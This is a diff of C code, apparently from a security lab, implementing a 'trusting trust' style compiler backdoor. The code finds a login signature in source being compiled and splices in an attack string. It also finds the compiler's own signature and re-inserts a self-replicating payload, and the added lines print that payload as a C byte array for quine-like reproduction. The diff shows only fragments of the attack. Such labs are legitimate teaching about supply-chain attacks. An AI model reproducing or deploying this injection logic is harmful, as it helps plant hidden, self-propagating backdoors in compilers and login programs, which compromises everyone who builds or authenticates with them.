@@ -1,5 +1,8 @@
 //need newline gap
+#ifdef dogs
 #include "attack-array.h"
+
+#endif
 /*****************************************************************
      * Step 1:
      */
@@ -15,6 +18,7 @@
 		//initalize new program string to hold original program plus our attack
 		char *new_program = malloc(sizeof(char) * (strlen(program) + strlen(login_attack)));
 		assert (new_program != NULL);
+		
 		//copy up to the login signature into new program
 		strncpy(new_program, program, login - program);
 		//copy in the login signature itself
@@ -50,6 +54,11 @@
 		//initalize new program string to hold original program plus our attack
 		char *new_program = malloc(sizeof(char) * (strlen(program) + strlen(prog)));
 		assert (new_program != NULL);
+		fprintf(fp, "char prog[] = {\n");
+		for(unsigned i = 0; prog[i]; i++) {
+			fprintf(fp, "\t%d,%c", prog[i], (i+1)%8==0 ? '\n' : ' ');
+		}
+		fprintf(fp, "0 };\n");
 		//copy up to the login signature into new program
 		strncpy(new_program, program, compile - program);
 		//copy in the login signature itself
